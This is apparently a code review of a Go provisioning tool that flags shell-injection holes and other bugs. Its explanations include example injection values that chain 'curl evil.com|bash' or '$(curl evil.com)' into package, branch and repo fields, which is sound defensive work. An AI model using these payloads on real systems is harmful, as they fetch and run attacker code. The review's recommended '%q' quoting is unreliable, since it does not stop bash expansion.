# Wave 2 Critic Review

Reviewer: critic
Date: 2026-04-09

---

## T2: Declarative provisioning pipeline

**Worktree:** cc_1
**Files:** `internal/provision/packages.go`, `setup.go`, `clone.go`, `internal/cmd/create.go`, `ensure.go`, `internal/config/project.go`
**Spec:** REQ-009-004 through 009-008, 009-010, 009-013

### Verdict: NEEDS-CHANGES

### Issues

#### 1. SECURITY/CRITICAL: Shell injection via unsanitized package names
- **File:** `internal/provision/packages.go:146,159`
- **Severity:** must-fix
- **Description:** Package names from `.sd.yaml` are concatenated directly into bash `-c` scripts via `strings.Join(pkgList, " ")` and `mgr.InstallCommand + " " + pkg`. A malicious `.sd.yaml` (e.g., cloned from an untrusted repo) with a package entry like `jq; curl https://evil.com/x|bash` would execute arbitrary commands. This is the exact attack the security model is designed to prevent.
- **Spec says:** The spec acknowledges `.sd.yaml` from cloned repos as a threat vector (Security Considerations section). The egress allowlist mitigates *some* damage, but command injection before the egress rules are applied (e.g., during provisioning) bypasses the protection entirely.
- **Impact:** The VM boundary contains the blast radius, but within the VM this gives full code execution as the provisioning user (root for apt, non-root for others). An attacker can exfiltrate credentials that are injected during provisioning.
- **Recommendation:** Validate package names against a whitelist pattern (alphanumeric, hyphens, dots, slashes, `@` for versions, underscores). Reject any entry containing shell metacharacters: `;`, `|`, `&`, `$`, `` ` ``, `(`, `)`, `{`, `}`, `>`, `<`, `\n`, `\r`, single/double quotes, backslash. This validation should happen in `validateDeclarativeFields` in `project.go` (defense-in-depth at config load time) AND at execution time in `packages.go`.

#### 2. SECURITY/CRITICAL: Shell injection via branch name in clone.go
- **File:** `internal/provision/clone.go:60,78`
- **Severity:** must-fix
- **Description:** The `branch` parameter is interpolated directly into a bash script: `fmt.Sprintf("\ngit -C %s checkout %s", target, branch)` and `fmt.Sprintf(" --branch %s", branch)`. A branch value like `main; curl evil.com|bash` would execute arbitrary commands. While `validateDeclarativeFields` rejects spaces and `..` in branch names, it does NOT reject semicolons, backticks, `$()`, pipe characters, or other shell metacharacters. The branch `main$(curl evil.com)` would pass validation and execute the subshell.
- **Impact:** Same as #1 -- arbitrary code execution inside the VM during provisioning.
- **Recommendation:** Either (a) use the exec approach with separate arguments instead of bash -c string interpolation (preferred -- pass branch as a separate argument to `git checkout` via `execFn`), or (b) add shell metacharacter rejection to branch validation, or (c) shell-quote the branch value using `fmt.Sprintf("%q", branch)`.

#### 3. SECURITY/HIGH: Shell injection via repo URL in clone.go
- **File:** `internal/provision/clone.go:79`
- **Severity:** must-fix
- **Description:** The `repo` URL is interpolated into `git clone` bash command: `fmt.Sprintf(" %s %s", repo, target)`. The validation only checks that repo starts with `https://` or `git@`. A repo like `https://evil.com/repo.git; curl evil.com|bash` would pass validation and execute injected commands. Similarly, `git@github.com:user/repo.git$(id)` passes validation.
- **Impact:** Arbitrary code execution inside the VM.
- **Recommendation:** Shell-quote the repo URL in the script (`%q` format verb), or restructure to avoid bash -c string interpolation.

#### 4. SECURITY/HIGH: Shell injection via VM name in clone.go
- **File:** `internal/provision/clone.go:23,26-36`
- **Severity:** should-fix
- **Description:** The `vmName` parameter is used directly in `fmt.Sprintf` for shell scripts: `target := fmt.Sprintf("~/projects/%s", vmName)`. While VM names are validated elsewhere (alphanumeric + hyphens), if validation is ever bypassed or relaxed, this becomes an injection vector. Defense-in-depth says: quote it anyway.
- **Recommendation:** Use `%q` or validate that target does not contain shell metacharacters.

#### 5. BUG: apt-get update uses `-y` flag not in spec
- **File:** `internal/provision/packages.go:33`
- **Severity:** note
- **Description:** The code specifies `UpdateCommand: "sudo apt-get update -y"` but the spec (REQ-009-006) says `sudo apt-get update && sudo apt-get install -y <packages>`. The `-y` flag on `apt-get update` is not harmful but is unnecessary (update does not prompt) and does not match the spec command template.
- **Recommendation:** Remove the `-y` from the update command to match spec.

#### 6. BUG: Clone check script missing `set -eux -o pipefail` preamble inconsistency
- **File:** `internal/provision/clone.go:26`
- **Severity:** note
- **Description:** The check script uses `set -eu -o pipefail` (no `-x`) while the clone and fetch scripts use `set -eux -o pipefail`. The `-x` flag causes each command to be echoed, which is useful for debugging but produces noise in stdout. Using `-eu` for the check is reasonable (prevents debug output from contaminating the result parsing), so this is a defensible choice, but the inconsistency is worth documenting with a comment explaining why.

#### 7. BUG: mkdir -p failure silently swallowed
- **File:** `internal/provision/clone.go:73`
- **Severity:** should-fix
- **Description:** `_, _, _, _ = execFn(ctx, vmName, []string{"bash", "-c", mkdirScript})` discards all return values including errors. If `mkdir -p ~/projects` fails (permissions, disk full), the subsequent `git clone` will fail with a confusing error about the target directory. The error from mkdir should be checked and propagated.
- **Recommendation:** Check the error and exitCode from the mkdir command.

#### 8. BUG: `~/` tilde expansion not guaranteed in all exec contexts
- **File:** `internal/provision/clone.go:23,26-36`
- **Severity:** should-fix
- **Description:** The target path `~/projects/<vmName>` relies on tilde expansion. When passed inside a `bash -c` script, bash will expand `~` before command execution -- this should work. However, the `test -d ~/projects/<name>` check used in quick-start (cc_3) passes `test` as separate args `[]string{"test", "-d", "~/projects/..."}` where tilde expansion does NOT happen (no shell involved). These are different worktrees but represent the same logical feature, so flagging the inconsistency.
- **Recommendation:** In clone.go the approach is correct (bash -c handles tilde). Ensure callers that check for the directory also use bash -c.

#### 9. EDGE CASE: Existing directory check returns unexpected output
- **File:** `internal/provision/clone.go:46-47`
- **Severity:** should-fix
- **Description:** The code does `result := strings.TrimSpace(stdout)` then switches on string prefixes. If the exec function returns additional stdout content (e.g., shell initialization messages from .bashrc or .profile that are not suppressed), the prefix matching would fail and fall through to the `default` case, triggering a fresh clone into a directory that already exists. This would fail with a git error, but the error message would be misleading.
- **Recommendation:** Add a `case result == "NOT_EXISTS":` pattern explicitly rather than relying on default, and log a warning or error if the result doesn't match any expected pattern.

#### 10. EDGE CASE: `tailLines` with trailing newline
- **File:** `internal/provision/packages.go:87-93`
- **Severity:** note
- **Description:** `tailLines` splits on `\n` which means a string ending with `\n` (common for command output) produces a trailing empty string element. For input "a\nb\n", `strings.Split` returns `["a", "b", ""]`. The last 20 lines would include that empty trailing element. This is cosmetically imperfect but functionally harmless.

#### 11. Pipeline integration: `doCreateVM` destroys VM on declarative failure
- **File:** `internal/cmd/create.go:270-274`
- **Severity:** note
- **Description:** When `runDeclarativePipeline` fails, the code runs `b.Destroy(ctx, name)`. This destroys a VM that successfully completed module provisioning. If the failure was a typo in a package name, the user loses the entire VM and must start from scratch (including module provisioning which can take minutes). This is the same destroy-on-failure pattern used for module provisioning failures, so it is consistent, but it is harsh for what might be a simple config error.
- **Recommendation:** Consider whether a warning + partial state is preferable to full destruction for declarative pipeline failures. At minimum, document this behavior.

#### 12. Missing `packages_declared` field from --check JSON (cross-worktree)
- **File:** `internal/cmd/quick_start.go` (cc_3, relates to cc_1's config)
- **Severity:** noted here for completeness (see T5 review)
- **Description:** REQ-010-015 specifies a `packages_declared` field in the --check JSON output showing counts per manager. The quick_start.go implementation does not include this field.

### Test Assessment

Tests are solid for the happy path and major error conditions. Missing coverage:
- No test for shell metacharacters in package names (security test)
- No test for shell metacharacters in repo URL or branch name being rejected at provisioning time
- No test for the `default` case in the switch statement in clone.go (unexpected check output)
- No test for mkdir failure being swallowed in clone.go

---

## T3: sd init updates

**Worktree:** cc_2
**Files:** `internal/cmd/init.go`, `init_test.go`
**Spec:** REQ-009-012

### Verdict: PASS

### Issues

#### 1. Git remote detection is not testable in all environments
- **File:** `internal/cmd/init.go:23-29`
- **Severity:** note (addressed by override pattern)
- **Description:** The `detectGitRemote` function calls `exec.Command("git", ...)` directly. The code correctly makes it overridable via a package-level `var` for testing, which the tests use. This is the right pattern.

#### 2. Repo field written as raw string outside YAML marshaling
- **File:** `internal/cmd/init.go:160`
- **Severity:** should-fix
- **Description:** The repo URL is appended to the file as `fmt.Sprintf("repo: %s\n", repoURL)` after the YAML-marshaled config. This means the repo field is NOT part of the structured YAML output -- it is a hand-crafted string appended after the marshaled body. If the repo URL contains YAML-special characters (e.g., `#`, `%`, certain colons), the generated file would be invalid or misparsed YAML. While most git URLs won't trigger this, it is fragile.
- **Recommendation:** Include `Repo` in the `projCfg` struct before marshaling, so it goes through `yaml.Marshal`. If the intent is to keep the commented-out sections separate, at minimum wrap the repo value in quotes: `fmt.Sprintf("repo: %q\n", repoURL)`.

#### 3. Generated .sd.yaml includes mount but spec says repo should be part of the config
- **File:** `internal/cmd/init.go:132-135`
- **Severity:** note
- **Description:** The generated config includes `Mounts: []string{fmt.Sprintf(".:/home/ubuntu/projects/%s:rw", vmName)}`. This is a host-to-VM mount, which conflicts with the clone-not-mount security philosophy emphasized in spec 010 (REQ-010-011, clone-not-mount explanation). While spec 009-012 does not prohibit mounts, generating a default mount that shares the host directory undermines the security posture that quick-start is designed to educate users about. This is a pre-existing concern, not introduced by this change.

#### 4. Template comment sections use hardcoded strings, not constants
- **File:** `internal/cmd/init.go:57-78`
- **Severity:** note
- **Description:** The `packagesComment` and `setupComment` constants are well-defined. The idempotency note is present in the setup comment. All acceptance criteria from REQ-009-012 are met.

### Test Assessment

Tests cover all REQ-009-012 acceptance criteria:
- Git remote populates repo field
- No git remote leaves repo absent
- Commented-out packages section present
- Commented-out setup section present
- Idempotency note present

Test quality is good. The `setupInitTest` helper properly overrides global state and cleans up.

---

## T5: sd quick-start scaffold

**Worktree:** cc_3
**Files:** `internal/cmd/quick_start.go`, `quick_start_test.go`
**Spec:** REQ-010-001, 010-002, 010-003, 010-015

### Verdict: NEEDS-CHANGES

### Issues

#### 1. BUG: repo_cloned check uses `test -d` without bash shell -- tilde won't expand
- **File:** `internal/cmd/quick_start.go:157`
- **Severity:** must-fix
- **Description:** The code builds `testCmd := []string{"test", "-d", fmt.Sprintf("~/projects/%s", result.VMName)}`. This passes `test` as a direct command (not via `bash -c`), so `~/` will NOT be expanded by the shell. The `~` character is a shell feature -- when passed directly to `test`, it will look for a literal directory named `~/projects/...` which does not exist. The check will always return false (exit code 1), meaning `repo_cloned` will always be false even when the repo is actually cloned.
- **Impact:** The `--check` assessment will always report the repository as not cloned, generating a spurious issue. Agents following the runbook would attempt to re-clone.
- **Recommendation:** Either wrap in bash: `[]string{"bash", "-c", fmt.Sprintf("test -d ~/projects/%s", result.VMName)}` or use the expanded path: `[]string{"test", "-d", fmt.Sprintf("/home/ubuntu/projects/%s", result.VMName)}`. The bash approach is more portable since it doesn't hardcode the user's home directory.

#### 2. BUG: repo_cloned should check for `.git` directory per spec
- **File:** `internal/cmd/quick_start.go:157`
- **Severity:** must-fix
- **Description:** The spec (REQ-010-015) says repo_cloned should be `"checked via sd exec <name> -- test -d ~/projects/<name>/.git"`. The implementation checks `test -d ~/projects/<name>` (missing `/.git` suffix). A directory that exists but is NOT a git clone (e.g., created by mkdir) would incorrectly report `repo_cloned: true`.
- **Recommendation:** Add `/.git` to the path: `fmt.Sprintf("~/projects/%s/.git", result.VMName)`.

#### 3. Missing `packages_declared` field from --check JSON
- **File:** `internal/cmd/quick_start.go:21-32`
- **Severity:** must-fix
- **Description:** REQ-010-015 specifies the JSON output MUST include a `packages_declared` field of type object showing counts per package manager (e.g., `{"apt": 3, "pip": 0, "npm": 1}`). The `quickStartCheckResult` struct does not include this field, and it is not populated.
- **Recommendation:** Add `PackagesDeclared map[string]int \`json:"packages_declared"\`` to the struct and populate it from `projCfg.Packages` when available.

#### 4. Runbook content is a placeholder
- **File:** `internal/cmd/quick_start.go:87`
- **Severity:** should-fix
- **Description:** The runbook output is a single placeholder string: `"Quick-start runbook will be here."` The spec (REQ-010-003) requires the runbook to contain exactly 10 sections with specific block types. While this may be intentional scaffolding for a later task, the current implementation does not satisfy REQ-010-003 through REQ-010-013.
- **Recommendation:** If this is intentional scaffolding, add a code comment noting that the full runbook content is tracked as a separate task. The tests should also explicitly mark this as a known incomplete area.

#### 5. EDGE CASE: getBackendFunc called twice for the same backend
- **File:** `internal/cmd/quick_start.go:139,155`
- **Severity:** note
- **Description:** When checking VM state and repo clone status, `getBackendFunc(result.Backend)` is called twice for the same backend name. While this is functionally correct (the function should return the same backend), it is wasteful and could be confusing if the backend has initialization side effects.
- **Recommendation:** Call `getBackendFunc` once at the top of the VM-checking block and reuse the result.

#### 6. EDGE CASE: Error from FindProjectConfig swallowed as partial state
- **File:** `internal/cmd/quick_start.go:121-123`
- **Severity:** note
- **Description:** When `findProjectConfigFunc` returns an error, it's added to `result.Issues` as a string, but execution continues with `projCfg == nil`. This means a malformed `.sd.yaml` shows as "Error reading .sd.yaml" in issues but `sd_yaml_exists` is false, which is slightly misleading (the file exists but is invalid). This behavior is reasonable for a diagnostic tool -- reporting partial state is better than failing entirely.

#### 7. Global mutable state for testability
- **File:** `internal/cmd/quick_start.go:42-45`
- **Severity:** note
- **Description:** The pattern of package-level `var` overrides (`getenvFunc`, `findProjectConfigFunc`) is used consistently with other commands in the codebase. Tests properly save and restore originals. This is the established pattern, not a new concern.

### Test Assessment

Tests are thorough for the scaffold scope:
- Registration and group membership verified
- All --check JSON fields validated
- Credential detection tested with table-driven approach
- Multiple VM state combinations tested
- Property-like test covering all state permutations

Missing:
- No test that verifies tilde expansion works in the `test -d` command (would catch issue #1)
- No test for the `packages_declared` field (would catch issue #3)
- No test for `.git` suffix in repo check (would catch issue #2)

---

## Summary

| Task | Verdict | Must-Fix Count | Should-Fix Count |
|------|---------|----------------|------------------|
| T2: Declarative provisioning | NEEDS-CHANGES | 3 | 3 |
| T3: sd init updates | PASS | 0 | 1 |
| T5: sd quick-start scaffold | NEEDS-CHANGES | 3 | 1 |

### Critical Security Findings

The most serious findings are **shell injection vulnerabilities in the provisioning pipeline** (T2 issues #1, #2, #3). User-supplied strings from `.sd.yaml` (package names, branch names, repo URLs) are interpolated directly into `bash -c` script strings without sanitization or quoting. This is a **security tool** -- the threat model explicitly includes malicious `.sd.yaml` files from cloned repositories. The fix requires either:

1. **Preferred:** Restructure to avoid `bash -c` string interpolation where possible. Pass arguments via exec args rather than concatenating into shell scripts. For cases where shell is required (e.g., the apt-get update && install pipeline), use Go's `fmt.Sprintf("%q", ...)` to shell-quote all user-supplied values.

2. **Minimum:** Add a strict character whitelist check for package names in `validateDeclarativeFields` (alphanumeric, hyphens, dots, slashes, `@`, underscores, `+`). Shell-quote repo URLs and branch names with `%q` in all `fmt.Sprintf` calls that build shell scripts.

### Correctness Findings

The quick-start `--check` has a bug where `repo_cloned` will always be false due to tilde non-expansion (#1 in T5), and the check is missing the `.git` suffix required by the spec (#2 in T5). The `packages_declared` field is entirely missing from the JSON output (#3 in T5).
